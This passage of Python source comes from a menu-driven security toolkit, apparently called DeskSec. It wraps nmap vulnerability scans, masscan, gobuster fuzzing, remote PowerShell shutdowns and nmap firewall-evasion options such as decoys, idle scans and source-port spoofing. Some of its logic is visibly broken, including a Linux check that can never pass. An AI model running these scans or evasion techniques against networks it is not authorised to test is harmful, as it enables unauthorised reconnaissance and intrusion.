                    subnet_mask = subnet_mask.group(1)

        if ip_address and subnet_mask:
            # Convert Subnet Mask to CIDR
            cidr_suffix = sum(bin(int(x)).count('1') for x in subnet_mask.split('.'))
            network = ipaddress.IPv4Network(f"{ip_address}/{cidr_suffix}", strict=False)
            return str(network)
        else:
            return "192.168.1.0/24"  # Fallback example

    except Exception as e:
        print(f"❌ Error detecting network range: {e}")
        return "192.168.1.0/24"

default_network = get_network_range()

def run_nmap_scan(network_range, max_hosts=0):
    # 🌐 Get the recommended network range dynamically
    

    # 📌 Updated user prompt
    """Run an Nmap scan with a user-defined limit, save results to a log file, and colorize output."""
    
    timestamp = datetime.now().strftime("%Y-%m-%d_%H-%M-%S")
    log_file = f"vuln_scan_{timestamp}.txt"
    
    print(f"\n🌐 Running Network-Based Vulnerability Scan (Nmap)...")
    print(f"📁 Scan results will be saved to: {log_file}")

    try:
        # Detect active devices on the network
        print("\n🌐 Detecting active network devices...")
        discovery_cmd = ["nmap", "-sn", network_range]
        result = subprocess.run(discovery_cmd, capture_output=True, text=True)
        
        # Extract live IPs
        live_hosts = [line.split()[-1] for line in result.stdout.split("\n") if "Nmap scan report for" in line]

        if not live_hosts:
            print(Fore.RED + "❌ No active devices detected on the network." + Style.RESET_ALL)
            return
        
        print(f"📌 {len(live_hosts)} devices found on the network.")

        # Apply host limit
        if max_hosts > 0:
            live_hosts = live_hosts[:max_hosts]
            print(f"🔍 Limiting scan to {max_hosts} hosts.")

        # Scan each host and process results
        with open(log_file, "w", encoding="utf-8") as log:  # ✅ Ensure UTF-8 encoding
            for host in live_hosts:
                print(f"\n🔍 Running Nmap scan on {host}...")
                scan_cmd = ["nmap", "-sS", "-sV", "--script", "vuln", host]
                result = subprocess.run(scan_cmd, capture_output=True, text=True)

                log.write(f"\n📌 Nmap scan results for {host}:\n{result.stdout}\n")  # ✅ Save full details to file
                
                # Extract & Color-Code Simplified Output
                print(f"\n📌 {Fore.CYAN}Nmap scan summary for {host}:{Style.RESET_ALL}")
                for line in result.stdout.split("\n"):
                    if "VULNERABLE" in line or "CVE-" in line or "may be vulnerable" in line:
                        print(colorize_vulnerability(line))  # ✅ Show vulnerabilities in color

    except KeyboardInterrupt:
        print("\n❌ Scan canceled by user. Exiting gracefully...")
        return

    print(f"✅ Scan completed! Results saved to: file:///{os.path.abspath(log_file)}")
    safe_input("Press Enter to return to the Automation & Scripting Menu...")

def automated_vuln_scan():
    """Menu for running a network vulnerability scan."""
    network_range = input(f"\nEnter network range or an IP address to scan (e.g., {default_network}): ").strip()
    if not network_range:
        network_range = "192.168.1.0/24"  # Default subnet
    try:
        max_hosts = int(safe_input("Enter max number of hosts to scan (0 for all): ").strip() or "0")
    except ValueError:
        max_hosts = 0

    run_nmap_scan(network_range, max_hosts)

colorama.init(autoreset=True) # Auto reset color after each print

def colorize_vulnerability(text):
    """Apply colors based on severity levels in Nmap results."""
    if "VULNERABLE" in text or "CVE-" in text:
        return Fore.RED + text + Style.RESET_ALL  # 🔴 Critical
    elif "may be vulnerable" in text or "potential" in text:
        return Fore.YELLOW + text + Style.RESET_ALL  # 🟡 Medium-risk
    else:
        return Fore.GREEN + text + Style.RESET_ALL  # 🟢 Info / Safe
    
def get_system_health_report():
    """Generate a detailed system health report."""
    print("\n📋 Generating System Health Report...\n")

    # 🖥 System Info
    system_info = platform.uname()
    os_version = f"{system_info.system} {system_info.release} ({system_info.version})"
    uptime_seconds = int(psutil.boot_time())
    uptime = datetime.now() - datetime.fromtimestamp(uptime_seconds)

    # 📊 Resource Usage
    cpu_usage = psutil.cpu_percent(interval=1)
    memory = psutil.virtual_memory()
    disk = psutil.disk_usage('/')

    # 🏆 Top 5 Memory-Consuming Processes
    process_list = []
    for proc in psutil.process_iter(['pid', 'name', 'memory_percent']):
        process_list.append(proc.info)

    top_processes = sorted(process_list, key=lambda p: p['memory_percent'], reverse=True)[:5]

    # 📡 Network Info
    try:
        hostname = platform.node()
        ip_address = ip_address = socket.gethostbyname(hostname)
    except:
        hostname, ip_address = "Unknown", "Unknown"

    # 📌 Report
    report = f"""
    🖥  System Information:
        - OS: {os_version}
        - Hostname: {hostname}
        - IP Address: {ip_address}
        - Uptime: {uptime.days} days, {str(timedelta(seconds=uptime.seconds))}
    
    📊 Resource Usage:
        - CPU Usage: {cpu_usage}%
        - Memory Usage: {memory.percent}% ({memory.used // (1024**3)}GB / {memory.total // (1024**3)}GB)
        - Disk Usage: {disk.percent}% ({disk.used // (1024**3)}GB / {disk.total // (1024**3)}GB)

    """
    report += "🏆 Top 5 Memory-Consuming Processes:\n"
    for proc in top_processes:
        report += f"        - {proc['name']:<18} (PID: {proc['pid']:6}) - {proc['memory_percent']:6.2f}%\n"

    print(report)
    safe_input("Press enter to return to Automation & Scripting menu...")
    return report

def remote_reboot_shutdown():
    """Menu for rebooting or shutting down a remote system."""
    while True:
        clear_screen()
        print("\n🔄 DeskSec - Remote System Reboot/Shutdown")
        print("1  Reboot Local Machine")
        print("2  Shutdown Local Machine")
        print("3  Reboot Remote Machine")
        print("4  Shutdown Remote Machine")
        print("5  Back to Automation Tools Menu")

        choice = safe_input("\nSelect an option: ")

        if choice == "1":
            confirm = safe_input("⚠️  Are you sure you want to **REBOOT** your machine? (y/n): ").strip().lower()
            if confirm == "y":
                reboot_system()
        elif choice == "2":
            confirm = safe_input("⚠️  Are you sure you want to **SHUT DOWN** your machine? (y/n): ").strip().lower()
            if confirm == "y":
                shutdown_system()
        elif choice == "3":
            target = safe_input("🔹 Enter the remote computer name or IP: ").strip()
            confirm = input(f"⚠️  Are you sure you want to **REBOOT** {target}? (y/n): ").strip().lower()
            if confirm == "y":
                reboot_system(target)
        elif choice == "4":
            target = safe_input("🔹 Enter the remote computer name or IP: ").strip()
            confirm = safe_input(f"⚠️  Are you sure you want to **SHUT DOWN** {target}? (y/n): ").strip().lower()
            if confirm == "y":
                shutdown_system(target)
        elif choice == "5":
            return  # Go back to Automation Tools Menu
        else:
            print("❌ Invalid choice. Please select a valid option.")

        safe_input("\nPress Enter to continue...")  # Pause before returning to menu

def reboot_system(target="localhost"):
    """Reboot the local or remote system using PowerShell."""
    print(f"🔄 Attempting to reboot {'local machine' if target == 'localhost' else target}...")
    command = ["powershell", "-Command", f"Restart-Computer -ComputerName {target} -Force -Confirm:$false -Credential (Get-Credential)"]
    
    try:
        subprocess.run(command, shell=True)
        print("✅ Reboot command sent successfully.")
    except Exception as e:
        print(f"❌ Error: {e}")

def shutdown_system(target="localhost"):
    """Shutdown the local or remote system using PowerShell."""
    print(f"⚠️  Attempting to shut down {'local machine' if target == 'localhost' else target}...")
    command = ["powershell", "-Command", f"Stop-Computer -ComputerName {target} -Force -Confirm:$false -Credential (Get-Credential)"]
    
    try:
        subprocess.run(command, shell=True)
        print("✅ Shutdown command sent successfully.")
    except Exception as e:
        print(f"❌ Error: {e}")

def is_domain_controller():
    """Check if the system is a Domain Controller by querying Active Directory roles."""
    try:
        result = subprocess.run(["powershell", "-Command", 
            "(Get-WmiObject Win32_ComputerSystem).DomainRole"], 
            capture_output=True, text=True)

        # Domain Controllers have a DomainRole value of 4 or 5
        return result.stdout.strip() in ["4", "5"]
    except Exception as e:
        print(f"❌ Error checking system role: {e}")
        return False

def enforce_gpo():
    """Determine system role and enforce Group Policies accordingly."""
    hostname = socket.gethostname()
    print(f"🔍 Checking system role on {hostname}...\n")

    if is_domain_controller():
        print("🏢 Running on a Domain Controller. Enforcing GPOs across the network...")

        # Push GPO updates to all clients in the domain
        powershell_cmd = [
            "powershell", "-Command", 
            "Get-ADComputer -Filter * | ForEach-Object { Invoke-GPUpdate -Computer $_.Name -Force -ErrorAction SilentlyContinue }"
        ]
        
        subprocess.run(powershell_cmd, shell=True)
        print("✅ Group Policies pushed to all domain clients.")
        safe_input("Press Enter to return to the Automation and Scripting Menu...")

    else:
        print("💻 Running on a client machine. Forcing local GPO update...")
        
        # Run local gpupdate
        subprocess.run(["gpupdate", "/force"], shell=True)
        print("✅ Local Group Policies updated.")

        # Retrieve last GPO applied time
        print("📋 Fetching last GPO application time...\n")
        result = subprocess.run(["gpresult", "/r"], capture_output=True, text=True)
        output_lines = result.stdout.split("\n")

        # Extract and display the "Last time Group Policy was applied" field
        for line in output_lines:
            if "Last time Group Policy was applied" in line:
                print(f"🕒 {line.strip()}")
                break
        else:
            print("⚠️ Could not retrieve last applied GPO timestamp.")

    print("\n🎯 GPO Enforcement Completed.")
    safe_input("Press Enter to return to the Automation and Scripting Menu...")

###########################################################################
#                                                                         #
#                         ADVANCED SECURITY MENU                          #
#                                                                         #
###########################################################################

def advanced_security_menu():
    """Advanced Security Menu"""
    while True:
        clear_screen()
        print("\n🛡  DeskSec - Advanced Security")
        print("1  Network Recon & Enumeration")
        print("2  OSINT Investigations")
        print("3  Vulnerability Scanning & Exploitation (Linux Only)")
        print("4  Web Application Security (Linux Only)")
        print("5  Credential Auditing & Brute Force")
        print("6  Traffic Analysis & Packet Sniffing")
        print("7  Incident Response & Forensics")
        print("8  Red Team Tools")
        print("9  SOC & Threat Intelligence")
        print("10  Back to Main Menu")

        choice = safe_input("Select an Option: ")

        if choice == "1":
            network_recon_enumeration()
        elif choice == "2":
            osint_investigations_menu()
        elif choice == "3":
            if platform.system().lower != "linux":
                print("This section is Linux-only. Please switch your environment.")
                time.sleep(3)
            else:
                vulnerability_menu()
        elif choice == "4":
            if platform.system().lower != "linux":
                print("This section is Linux-only. Please switch your environment.")
                time.sleep(3)
            else:
                web_security_menu()
        elif choice == "5":
            if platform.system().lower != "linux":
                print("This section is Linux-only. Please switch your environment.")
                time.sleep(3)
            else:
                credential_auditing_menu()
        elif choice == "6":
            traffic_analysis_menu()
        elif choice == "7":
            if platform.system().lower != "linux":
                print("This section is Linux-only. Please switch your environment.")
                time.sleep(3)
            else:
                incident_response_menu()
        elif choice == "8":
            red_team_menu()
        elif choice == "9":
            soc_threat_intelligence_menu()
        elif choice == "10":
            print("\nReturning to the main menu...")
            time.sleep(2)
            return
        else:
            print("❌ This feature is not implemented yet.")
            print("\nReturning to the Advanced Security Menu...")
            time.sleep(2)

def network_recon_enumeration():
    while True:
        clear_screen()
        print("🛰  Network Recon & Enumeration")
        print("1  Gobuster (Dir, DNS, Vhost Fuzzing)")
        print("2  Nmap (Port & Service Discovery)")
        print("3  Masscan (Ultra-Fast Network Scanning)")
        print("4  Netdiscover (Live Host Discovery)")
        print("5  Traceroute & Path Analysis")
        print("6  SMB/LDAP/FTP Recon")
        print("7  Back to Advanced Security Menu")

        choice = safe_input("Select an option: ")

        if choice == "1":
            run_gobuster()
        elif choice == "2":
            run_nmap()
        elif choice == "3":
            masscan_menu()
        elif choice == "4":
            run_netdiscover()
        elif choice == "5":
            run_traceroute()
        elif choice == "6":
            run_service_recon()
        elif choice == "7":
            return
        else:
            print("This has not been implemented yet.")
            return

SECLISTS_URL = "https://github.com/danielmiessler/SecLists"

def find_seclists():
    """Search for SecLists directory automatically."""
    possible_locations = [
        "C:\\SecLists-master", "E:\\SecLists-master",
        os.path.expanduser("~/SecLists"),
        os.path.expanduser("~/Desktop/SecLists"),
        os.path.join(os.getenv("USERPROFILE"), "Desktop", "SecLists"),
        os.path.join(os.getenv("USERPROFILE"), "Downloads", "SecLists")
    ]

    for path in possible_locations:
        if os.path.exists(path):
            print(f'✅ SecLists found at: {path}')
            return path
    return None

def suggest_wordlists(seclists_path, mode):
    """Find available wordlists for the selected Gobuster mode."""
    wordlist_paths = {
        "dir": f"{seclists_path}/Discovery/Web-Content/*.txt",
        "dns": f"{seclists_path}/Discovery/DNS/*.txt",
        "vhost": f"{seclists_path}/Discovery/DNS/*.txt",
    }

    wordlist_glob = wordlist_paths.get(mode)
    if not wordlist_glob:
        return []

    # Search for matching wordlists
    found_wordlists = glob.glob(wordlist_glob, recursive=True)
    
    if not found_wordlists:
        print("❌ No wordlists found for this mode.")
        return []

    return found_wordlists[:10]  # Return first 10 results for simplicity

def is_gobuster_installed():
    """Check if Gobuster is installed and return its path."""
    gobuster_path = shutil.which("gobuster") or os.path.expanduser("~/go/bin/gobuster.exe")

    if gobuster_path and os.path.exists(gobuster_path):
        return gobuster_path
    
    print("❌ Gobuster is not installed or not in PATH.")
    print(f"🔗 Download: https://github.com/OJ/gobuster")
    return None

def run_gobuster():    
    """Run Gobuster with user-defined options and real-time output."""
    gobuster_path = is_gobuster_installed()
    if not gobuster_path:
        return

    seclists_path = find_seclists()
    if not seclists_path:
        return

    print("\n🛡  Gobuster - Directory & Subdomain Fuzzing")
    print("1  Directory Fuzzing (dir)")
    print("2  Subdomain Enumeration (dns)")
    print("3  Virtual Host Bruteforcing (vhost)")
    print("4  Exit to Advanced Security Menu")

    mode_choice = safe_input("\nSelect a mode: ").strip()

    if mode_choice == "4":
        return

    mode_map = {"1": "dir", "2": "dns", "3": "vhost"}
    mode = mode_map.get(mode_choice)

    if not mode:
        print("❌ Invalid option. Returning to menu...")
        return

    if mode == "vhost":
        print("\n⚠️  Virtual Host Mode requires an **IP Address**, not a domain!")
        target = safe_input("🌐 Enter target **IP Address** for vhost fuzzing: ").strip()
    else:
        target = safe_input("🌐 Enter target URL or domain: ").strip()

    available_wordlists = suggest_wordlists(seclists_path, mode)

    if available_wordlists:
        print("\n🔍 Available Wordlists:")
        for i, wl in enumerate(available_wordlists, start=1):
            print(f"{i}. {wl}")

        wordlist_choice = safe_input("\n📂 Select a wordlist by number or press Enter to use default: ").strip()
        if wordlist_choice.isdigit() and 1 <= int(wordlist_choice) <= len(available_wordlists):
            wordlist = available_wordlists[int(wordlist_choice) - 1]
        else:
            wordlist = available_wordlists[0]
    else:
        wordlist = safe_input("📂 Enter wordlist path manually: ").strip()

    wordlist = os.path.normpath(wordlist)

    if not os.path.exists(wordlist):
        print(f"❌ Wordlist not found: {wordlist}")
        return

    # Additional Flags
    extensions = safe_input("📝 Enter file extensions for fuzzing (e.g., php,html,txt) or press Enter to skip: ").strip()
    threads = safe_input("⚡ Enter number of threads (default is 10): ").strip()
    timeout = safe_input("⏳ Enter max runtime in seconds (default is 300): ").strip()

    threads = threads if threads.isdigit() else "10"
    timeout = int(timeout) if timeout.isdigit() else 300

    output_file = f"gobuster_{mode}_results.txt"

    # ✅ Correct Argument Order
    if mode == "dns":
        target_flag = "-d"
    else:
        target_flag = "-u"

    command = [gobuster_path, mode, target_flag, target, "-w", wordlist, "-t", threads, "-o", output_file]

    if extensions and mode == "dir":
        command.extend(["-x", extensions])

    print("\n🚀 Running Gobuster... This may take some time.\n")
    print(f"🛠  Executing Command:\n{' '.join(command)}\n")  # ✅ Show exact command for debugging

    try:
        with subprocess.Popen(command, stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True, bufsize=1) as proc:
            for line in proc.stdout:
                print(line, end="")  # ✅ Real-time output

            # Capture any errors
            stderr_output = proc.stderr.read()
            if stderr_output:
                print("\n🚨 Gobuster STDERR Output:")
                print(stderr_output)

        print(f"\n✅ Gobuster scan complete. Results saved to {output_file}")

    except subprocess.TimeoutExpired:
        print(f"\n❌ Scan exceeded timeout ({timeout}s) and was terminated.")

    except KeyboardInterrupt:
        print("\n❌ Scan canceled by user. Exiting gracefully...")

    except Exception as e:
        print(f"❌ Error running Gobuster: {e}")

    print(f"\n🔗 For more wordlists, check out SecLists: {SECLISTS_URL}")
    safe_input("\nPress Enter to return to the Advanced Security Menu...")

KNOWN_PORTS = {
    80: "HTTP",
    443: "HTTPS",
    22: "SSH",
    25: "SMTP",
    445: "SMB",
    3306: "MySQL",
    3389: "RDP",
    58083: "JBoss (Potential)",
    49152: "Ephemeral Port",
    20080: "Alternate HTTP Port",
}

HISTORICAL_SCAN_FILE = "historical_scan_data.csv"

def find_latest_scan():
    """Find the latest Nmap scan file."""
    print("🔍 Looking for Nmap scan files...")
    scan_files = [f for f in os.listdir() if f.startswith("nmap_scan_") and f.endswith(".txt")]
    
    if not scan_files:
        print("❌ No Nmap scan files found.")
        return None

    latest_file = max(scan_files, key=os.path.getctime)
    print(f"✅ Found latest scan file: {latest_file}")
    return latest_file

def parse_nmap_log(file_path):
    """Parse standard Nmap output log and extract IP, ports, and services."""
    print(f"\n📂 Parsing Nmap log: {file_path}")

    try:
        data = []
        current_ip = None

        with open(file_path, "r", encoding="utf-8") as f:
            for line in f:
                # Extract the IP address when a new host report starts
                ip_match = re.search(r"Nmap scan report for ([\d\.]+)", line)
                if ip_match:
                    current_ip = ip_match.group(1)

                # Extract port, state, and service information
                port_match = re.match(r"(\d+)/tcp\s+(\w+)\s+(\S+)", line)
                if port_match and current_ip:
                    port, state, service = port_match.groups()
                    data.append({"ip": current_ip, "port": int(port), "state": state, "service": service})

        if not data:
            print("⚠️ No valid scan results found in the Nmap log.")
            return None

        csv_file = "nmap_scan_results.csv"
        df = pd.DataFrame(data)
        df.to_csv(csv_file, index=False)

        print(f"✅ Converted log to CSV: {csv_file}")
        return csv_file

    except Exception as e:
        print(f"❌ Error parsing Nmap log: {e}")
        return None

def load_historical_data():
    """Load historical scan data for comparison."""
    if os.path.exists(HISTORICAL_SCAN_FILE):
        return pd.read_csv(HISTORICAL_SCAN_FILE)
    return pd.DataFrame(columns=["port", "count"])

def update_historical_data(df):
    """Update the historical scan database."""
    historical_data = load_historical_data()
    for port in df["port"].unique():
        if port in historical_data["port"].values:
            historical_data.loc[historical_data["port"] == port, "count"] += 1
        else:
            historical_data = pd.concat([historical_data, pd.DataFrame({"port": [port], "count": [1]})])
    historical_data.to_csv(HISTORICAL_SCAN_FILE, index=False)

# Define general service recommendations based on known ports
port_guidelines = {
    21: "Check for anonymous FTP access and misconfigurations.",
    22: "Ensure SSH access is restricted to trusted IPs and uses key-based authentication.",
    80: "Verify if an HTTP service should be publicly accessible.",
    443: "Check if SSL/TLS configurations are up to date and secure.",
    445: "Confirm SMB is secured and not exposed unnecessarily.",
    3389: "Check if RDP is open to external access and properly secured.",
    58083: "Possible JBoss service detected. Check for misconfigurations or vulnerabilities.",
}

def generate_recommendation(port, service, frequency):
    """
    Generate a dynamic security recommendation based on scan data.
    """
    if port in port_guidelines:
        return port_guidelines[port]

    # If no service is detected, categorize based on port behavior
    if frequency < 2:
        return "This is a rarely seen port. Investigate if this service is needed."
    elif service and "http" in service:
        return "Ensure this web service is properly secured and monitored."
    elif service and "ftp" in service:
        return "Check for anonymous FTP access and secure credentials."
    elif service and "smb" in service:
        return "Confirm SMB is not open to unauthorized access."
    else:
        return "Investigate the service running on this port."
    
def detect_anomalies():
    """Detect anomalies in Nmap scan results using AI."""
    print("\n🤖 Running AI-driven anomaly detection on latest Nmap scan...")
    recommended_steps = {
        49152: "Ephemeral port detected. Verify if this is used by a legitimate service.",
        20080: "HTTP alternate port detected. Ensure it's not exposing a web service unintentionally.",
        58083: "Possible JBoss service detected. Check for misconfigurations or vulnerabilities."
    }
    log_file = find_latest_scan()
    if not log_file:
        print("⚠️ No scan file found. Exiting.")
        return

    csv_file = parse_nmap_log(log_file)
    if not csv_file:
        print("⚠️ No valid data extracted. Exiting.")
        return

    try:
        print(f"📊 Loading CSV file: {csv_file}")
        df = pd.read_csv(csv_file)
        historical_data = load_historical_data()
        print("✅ CSV Loaded successfully!")
        
        if "port" not in df.columns:
            print("❌ CSV file does not contain required fields ('port').")
            return
        
        # Determine how rare a port is
        df["frequency"] = df["port"].map(lambda p: historical_data[historical_data["port"] == p]["count"].sum() if p in historical_data["port"].values else 0)
        
        features = df[["port", "frequency"]]
        print("🧠 Training AI model on detected ports...")
        model = IsolationForest(contamination=0.05, random_state=42)
        df["anomaly_score"] = model.fit_predict(features)
        
        anomalies = df[df["anomaly_score"] == -1]
        anomalies = anomalies.copy()
        anomalies.loc[:, "reason"] = anomalies.apply(lambda row: f"Rarely seen port ({row['frequency']} occurrences)" if row["frequency"] < 2 else "Unusual service", axis=1)

        if not anomalies.empty:
            print("\n⚠️  Detected potential anomalies:")

            anomaly_table = anomalies[['ip', 'port', 'anomaly_score', 'reason']]

            print(tabulate(anomaly_table, headers="keys", tablefmt="grid"))

            anomaly_log = "detected_anomalies.csv"
            anomalies.to_csv(anomaly_log, index=False)
            print(f"✅ Anomaly report saved to: {anomaly_log}")
            print("\n Recommended Next Steps:")
            for index, row in anomalies.iterrows():
                ip = row["ip"]
                port = row["port"]
                service = row.get("service", "unknown")
                frequency = row.get("frequency", 0)

                recommendation = generate_recommendation(port, service, frequency)

                print(f"📌 {ip}:{port} → {row['reason']}")
                print(f"{recommendation}\n")
        else:
            print("✅ No anomalies detected in the scan.")
        
        # Update historical data
        update_historical_data(df)

    except Exception as e:
        print(f"❌ Error analyzing logs: {e}")

def run_nmap():
    """Advanced Nmap Scan Menu for Network Recon"""
    nmap_path = is_nmap_installed()
    if not nmap_path:
        return

    while True:
        clear_screen()
        print("\n🛡   Advanced Nmap Scanner")
        print("1  Quick Scan (Top 100 Ports)")
        print("2  Full Port Scan (-p-)")
        print("3  Service & OS Detection (-sV -O)")
        print("4  Vulnerability Scan (--script vuln)")
        print("5  Aggressive Scan (-sS -A)")
        print("6  Custom Scan (User-defined options)")
        print("7  Firewall Evasion & Stealth Scanning")
        print("8  Back to Network Recon Menu")

        choice = safe_input("\nSelect an option: ").strip()

        if choice == "8":
            return  # Return to Network Recon Menu

        # Get target from user
        target = safe_input("🌐 Enter target IP or domain: ").strip()

        if choice == "1":
            scan_args = ["-F"]  # Quick scan (Top 100 ports)
        elif choice == "2":
            scan_args = ["-p-", "-sS"]  # Full port scan
        elif choice == "3":
            scan_args = ["-sV", "-O"]  # Service & OS detection
        elif choice == "4":
            scan_args = ["--script", "vuln"]  # Vulnerability scan
        elif choice == "5":
            scan_args = ["-sS", "-A"]  # Aggressive scan
        elif choice == "6":
            scan_args = safe_input("✍️  Enter custom Nmap arguments: ").strip().split()
        elif choice == "7":
            firewall_evasion_menu(target)
        else:
            print("❌ Invalid option. Please try again.")
            continue

        execute_nmap(target, scan_args)

def generate_random_ip(): # generates a random ip address for decoy scanning
    """Generate a random IP address for Decoy Scanning"""
    return ".".join(str(random.randint(1, 255)) for _ in range(4))

def firewall_evasion_menu(target):
    """Firewall Evasion Techniques for Nmap"""
    while True:
        clear_screen()
        print("\n🛡   Nmap Firewall Evasion")
        print("1  Fragmented Packets (-f)")
        print("2  Decoy Scan (-D)")
        print("3  Idle Scan (Zombie) (-sI)")
        print("4  Randomized Timing (-T2)")
        print("5  Custom Packet Size (--mtu)")
        print("6  Source Port Spoofing (--source-port)")
        print("7  Back to Advanced Nmap Scanner")

        evasion_choice = safe_input("\nSelect an evasion technique: ").strip()

        if evasion_choice == "7":
            return  # Go back

        base_scan = ["-sS"]  # Use stealth SYN scan by default

        if evasion_choice == "1":
            scan_args = base_scan + ["-f"]
            print("\n🔍 Using **Fragmented Packets** (-f) to evade detection.")
        elif evasion_choice == "2":
            num_decoys = safe_input("🔀 Enter number of decoy IPs (1-5): ").strip()
            scan_args = base_scan + ["-D", ",".join([generate_random_ip() for _ in range(int(num_decoys))])]
            print("\n🕵️  Using **Decoy Scan** (-D) to hide origin.")
        elif evasion_choice == "3":
            zombie_ip = safe_input("🧟 Enter zombie host IP for Idle Scan: ").strip()
            scan_args = base_scan + ["-sI", zombie_ip]
            print("\n👻 Using **Idle Scan** (-sI) to mask scanning activity.")
        elif evasion_choice == "4":
            scan_args = base_scan + ["-T2"]
            print("\n🐢 Using **Randomized Timing** (-T2) to avoid detection.")
        elif evasion_choice == "5":
            mtu_size = safe_input("📦 Enter custom packet size (e.g., 8, 16, 32, 64): ").strip()
            scan_args = base_scan + ["--mtu", mtu_size]
            print("\n📏 Using **Custom Packet Size** (--mtu) to break detection signatures.")
        elif evasion_choice == "6":
            spoofed_port = safe_input("🚢 Enter spoofed source port (e.g., 53, 80, 443): ").strip()
            scan_args = base_scan + ["--source-port", spoofed_port]
            print("\n🎭 Using **Source Port Spoofing** (--source-port) to bypass rules.")
        else:
            print("❌ Invalid choice. Try again.")
            continue

        execute_nmap(target, scan_args)

def execute_nmap(target, scan_args):
    """Run an Nmap scan with real-time output and logging"""
    nmap_path = is_nmap_installed()
    if not nmap_path:
        return

    # Generate output file name
    timestamp = datetime.now().strftime("%Y-%m-%d_%H-%M-%S")
    log_file = f"nmap_scan_{target.replace('.', '_')}_{timestamp}.txt"
    grepable = "-oG"
    # Build the command
    command = [nmap_path, *scan_args, target]
    print("\n🚀 Running Nmap Scan...")
    print(f"🛠  Executing Command: {' '.join(command), grepable}\n")
    print(f"📁 Results will be saved to: {log_file}\n")

    try:
        with open(log_file, "w", encoding="utf-8") as log:
            with subprocess.Popen(command, stdout=subprocess.PIPE, stderr=subprocess.STDOUT, text=True, bufsize=1) as proc:
                for line in proc.stdout:
                    print(line, end="")  # Live output
                    log.write(line)  # Save to log file

        print(f"\n✅ Nmap scan complete. Results saved to {log_file}")

        choice = safe_input("\nWould you like to run the scan results through anomoly detection? (y, n)")
        if choice == "y":
            detect_anomalies()
            safe_input("Press Enter to return to the previous menu")
            return
        else:
            print("Returning to Advanced Nmap menu.")
            time.sleep(3)
            return

    except subprocess.TimeoutExpired:
        print("\n❌ Scan exceeded timeout and was terminated.")

    except KeyboardInterrupt:
        print("\n❌ Scan canceled by user. Exiting gracefully...")

    except Exception as e:
        print(f"❌ Error running Nmap: {e}")

    safe_input("\nPress Enter to return to the Advanced Security Menu...")

def is_masscan_installed():
    """Check if Masscan is installed and return its path."""
    masscan_path = shutil.which("masscan")
    if masscan_path:
        print(f"✅ Masscan is installed at: {masscan_path}")
        return masscan_path
    
    print("❌ Masscan is not installed!")
    install_choice = safe_input("🔧 Would you like to install Masscan? (y/n): ").strip().lower()
    if install_choice == "y":
        install_masscan()
        return shutil.which("masscan")
    return None

def install_masscan():
    """Attempt to install Masscan automatically on Windows and Linux."""
    system = platform.system().lower()
    if "windows" in system:
        install_masscan_windows()
    elif "linux" in system:
        install_masscan_linux()
    else:
        print("❌ Unsupported OS. Please install Masscan manually.")

def install_masscan_windows():
    """Download and install Masscan on Windows, then provide instructions for adding it to PATH."""
    url = "https://github.com/Arryboom/MasscanForWindows/raw/master/masscan64.exe"
    install_dir = "C:\\Masscan"
    exe_path = os.path.join(install_dir, "masscan.exe")
    
    print("\n🔄 Downloading Masscan for Windows...")
    os.makedirs(install_dir, exist_ok=True)
    
    try:
        response = requests.get(url, stream=True)
        with open(exe_path, "wb") as f:
            for chunk in response.iter_content(chunk_size=8192):
                f.write(chunk)
        
        print(f"✅ Masscan downloaded and saved to {exe_path}")

        # Provide manual PATH update instructions
        print("\n🔧 To add Masscan to PATH manually:")
        print("1 Open Windows Search and type 'Environment Variables'.")
        print("2 Click 'Edit the system environment variables'.")
        print("3 In the 'System Properties' window, click 'Environment Variables'.")
        print("4 Under 'System Variables', find and select 'Path', then click 'Edit'.")
        print(f"5 Click 'New' and add: {install_dir}")
        print("6 Click 'OK' to save, then restart your terminal.")

        print("\n🚀 After adding to PATH, test with:")
        print("   masscan --help")

    except Exception as e:
        print(f"❌ Masscan installation failed: {e}")

def install_masscan_linux():
    """Install Masscan on Linux using apt."""
    print("\n🔄 Installing Masscan on Linux...")
    try:
        subprocess.run(["sudo", "apt", "install", "masscan", "-y"], check=True)
        print("✅ Masscan installation completed.")
    except Exception as e:
        print(f"❌ Masscan installation failed: {e}")

def run_masscan(scan_type, target, ports="1-65535", rate=1000):
    """Run a Masscan scan, filter unnecessary status messages, and display results properly."""
    timestamp = datetime.now().strftime("%Y-%m-%d_%H-%M-%S")
    log_file = f"masscan_scan_{timestamp}.txt"

    print(f"\n🌐 Running Masscan ({scan_type}) on {target}...")
    print(f"📁 Scan results will be saved to: {log_file}")

    masscan_cmd = [
        "masscan", "-p", ports, target, "--rate", str(rate), "-oG", log_file
    ]

    print("\n🔧 Executing command:", " ".join(masscan_cmd))  # Debugging: Show full command

    try:
        result = subprocess.run(
            masscan_cmd,
            stdout=subprocess.PIPE,
            stderr=subprocess.PIPE,
            text=True,
            shell=True
        )

        error_output = result.stderr.strip()

        # Ignore normal Masscan status messages, only print real errors
        if error_output and "Starting masscan" not in error_output and "rate:" not in error_output:
            print(f"⚠️ Masscan Error: {error_output}")

        # Wait for Masscan to finish writing the file before reading it
        if os.path.exists(log_file):
            with open(log_file, "r", encoding="utf-8") as f:
                file_contents = f.readlines()
            
            discovered_ports = []
            for line in file_contents:
                if "Ports:" in line:  # Extract relevant scan results
                    discovered_ports.append(line.strip())

            if discovered_ports:
                print("\n✅ Scan Output:")
                for line in discovered_ports:
                    print(line)
            else:
                print("⚠️ No open ports found.")

        else:
            print("⚠️ Error: Masscan output file was not created.")

        print(f"\n✅ Scan completed! Results saved to: {log_file}")

    except KeyboardInterrupt:
        print("\n❌ Scan canceled by user. Exiting gracefully...")
    except Exception as e:
        print(f"❌ Error running Masscan: {e}")

def masscan_menu():
    """Menu for Masscan scanning options."""
    if not is_masscan_installed():
        return
    
    while True:
        print("\n🚀  Masscan - High-Speed Network Scanner")
        print("1  Quick Scan (Top 100 Ports)")
        print("2  Full Port Scan (-p-)")
        print("3  Large-Scale Fast Scan (Adjustable Rate)")
        print("4  Custom Scan (User-defined options)")
        print("5  Back to Network Recon Menu")
        
        choice = safe_input("\nSelect an option: ")
        
        if choice == "1":
            target = safe_input("Enter target IP or CIDR range: ").strip()
            run_masscan("Quick Scan", target, "1-1000", 5000)
        elif choice == "2":
            target = safe_input("Enter target IP or CIDR range: ").strip()
            run_masscan("Full Port Scan", target, "1-65535", 1000)
        elif choice == "3":
            target = safe_input("Enter target IP or CIDR range: ").strip()
            rate = safe_input("Enter scan rate (default: 10000 packets/sec): ").strip()
            run_masscan("Large-Scale Fast Scan", target, "1-65535", rate or 10000)
        elif choice == "4":
            target = safe_input("Enter target IP or CIDR range: ").strip()
